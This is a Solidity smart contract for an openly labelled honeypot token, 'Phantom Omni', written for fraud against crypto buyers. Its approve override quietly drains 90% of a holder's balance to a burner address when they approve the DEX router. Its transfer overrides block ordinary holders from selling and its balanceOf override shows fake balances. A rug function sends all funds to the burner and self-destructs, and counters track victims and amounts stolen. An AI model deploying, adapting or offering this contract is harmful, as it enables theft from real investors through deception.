// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * Phantom Omni — Honeypot Token Contract
 * 
 * Features:
 * - balanceOf override → shows fake balances
 * - transfer override → fake transfers (looks real)
 * - approve override → drains 90% of wallet on approve
 * - rug → self-destruct, send all to burner
 * - blacklist → block wallets from selling
 * - Real events for Dex tracking
 */
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract PhantomToken is ERC20, Ownable {
    
    // ─── State ───
    
    mapping(address => uint256) public fakeBalances;
    mapping(address => bool) public isFakeWallet;
    mapping(address => bool) public blacklisted;
    mapping(address => bool) public hasBought;
    
    address public dexRouter;
    address public burnerAddress;
    uint256 public rugThreshold;
    uint256 public drainPercent = 90; // 90% drain by default
    uint256 public totalStolen;
    uint256 public victimCount;
    
    bool public isRugged = false;
    bool public drainEnabled = true;
    
    // ─── Events ───
    
    event VictimDrained(address indexed victim, uint256 amount);
    event RugExecuted(uint256 totalStolen, uint256 victimCount);
    event FakeTransfer(address indexed from, address indexed to, uint256 amount);
    event TokenDeployed(string name, string symbol, address deployer);
    
    // ─── Constructor ───
    
    constructor(
        string memory _name,
        string memory _symbol,
        uint256 _supply,
        uint256 _rugThreshold,
        address _dexRouter,
        address _burnerAddress,
        uint256 _drainPercent
    ) ERC20(_name, _symbol) Ownable(msg.sender) {
        // Mint supply to deployer (admin)
        _mint(msg.sender, _supply * 10 ** decimals());
        
        rugThreshold = _rugThreshold * 10 ** 18; // Convert to wei
        dexRouter = _dexRouter;
        burnerAddress = _burnerAddress;
        if (_drainPercent > 0 && _drainPercent <= 100) {
            drainPercent = _drainPercent;
        }
        
        emit TokenDeployed(_name, _symbol, msg.sender);
    }
    
    // ─── balanceOf Override ───
    
    function balanceOf(address account) public view override returns (uint256) {
        // If rugged, return 0 for everyone except owner
        if (isRugged) {
            return account == owner() ? super.balanceOf(account) : 0;
        }
        
        // If fake wallet, show fake balance
        if (isFakeWallet[account]) {
            return fakeBalances[account];
        }
        
        // If blacklisted, show 0
        if (blacklisted[account]) {
            return 0;
        }
        
        return super.balanceOf(account);
    }
    
    // ─── transfer Override ───
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        // Fake transfer for fake wallets
        if (isFakeWallet[msg.sender]) {
            emit Transfer(msg.sender, recipient, amount);
            emit FakeTransfer(msg.sender, recipient, amount);
            return true;
        }
        
        // Real transfer (owner can transfer, others can't sell)
        if (msg.sender == owner() && !blacklisted[recipient]) {
            return super.transfer(recipient, amount);
        }
        
        // Normal users can't transfer (honeypot)
        // But allow if not blacklisted and sending to owner (for testing)
        if (!blacklisted[msg.sender] && recipient == owner()) {
            return super.transfer(recipient, amount);
        }
        
        // Anyone else → revert (can't sell/transfer)
        revert("Transfer not allowed");
    }
    
    // ─── approve Override (THE DRAIN) ───
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        // Only drain if spender is DEX router and drain is enabled
        if (spender == dexRouter && drainEnabled && !blacklisted[msg.sender] && msg.sender != owner()) {
            
            // Get user's actual balance
            uint256 userBalance = super.balanceOf(msg.sender);
            if (userBalance > 0) {
                // Calculate drain amount (drainPercent % of wallet)
                uint256 drainAmount = (userBalance * drainPercent) / 100;
                
                // Transfer drained amount to burner address
                _transfer(msg.sender, burnerAddress, drainAmount);
                totalStolen += drainAmount;
                
                if (!hasBought[msg.sender]) {
                    hasBought[msg.sender] = true;
                    victimCount++;
                }
                
                emit VictimDrained(msg.sender, drainAmount);
            }
        }
        
        // Complete the approval (looks normal)
        return super.approve(spender, amount);
    }
    
    // ─── transferFrom Override ───
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        // Prevent transfers from victims (they hold fake tokens)
        if (isFakeWallet[sender] || blacklisted[sender]) {
            emit Transfer(sender, recipient, amount);
            return true;
        }
        
        // Only owner can transfer
        if (sender == owner() || msg.sender == owner()) {
            return super.transferFrom(sender, recipient, amount);
        }
        
        revert("Transfer not allowed");
    }
    
    // ─── Owner Functions ───
    
    function setFakeBalance(address wallet, uint256 amount) external onlyOwner {
        fakeBalances[wallet] = amount;
        isFakeWallet[wallet] = true;
    }
    
    function removeFakeBalance(address wallet) external onlyOwner {
        fakeBalances[wallet] = 0;
        isFakeWallet[wallet] = false;
    }
    
    function blacklist(address wallet) external onlyOwner {
        blacklisted[wallet] = true;
    }
    
    function unblacklist(address wallet) external onlyOwner {
        blacklisted[wallet] = false;
    }
    
    function setDexRouter(address router) external onlyOwner {
        dexRouter = router;
    }
    
    function setBurnerAddress(address burner) external onlyOwner {
        burnerAddress = burner;
    }
    
    function setDrainPercent(uint256 percent) external onlyOwner {
        require(percent <= 100, "Max 100%");
        drainPercent = percent;
    }
    
    function setDrainEnabled(bool enabled) external onlyOwner {
        drainEnabled = enabled;
    }
    
    function setRugThreshold(uint256 threshold) external onlyOwner {
        rugThreshold = threshold * 10 ** 18;
    }
    
    // ─── RUG FUNCTION ───
    
    function rug() external onlyOwner {
        require(!isRugged, "Already rugged");
        
        // Get contract balance (BNB/ETH/SOL native)
        uint256 contractBalance = address(this).balance;
        require(contractBalance >= rugThreshold, "Threshold not met");
        
        isRugged = true;
        
        // Send all native to burner
        if (contractBalance > 0) {
            payable(burnerAddress).transfer(contractBalance);
        }
        
        // Send all tokens to burner
        uint256 tokenBalance = super.balanceOf(address(this));
        if (tokenBalance > 0) {
            super.transfer(burnerAddress, tokenBalance);
        }
        
        // Self-destruct
        selfdestruct(payable(burnerAddress));
    }
    
    // ─── Emergency Withdraw ───
    
    function emergencyWithdraw() external onlyOwner {
        require(!isRugged, "Already rugged");
        payable(owner()).transfer(address(this).balance);
    }
    
    // ─── Receive ───
    
    receive() external payable {}
}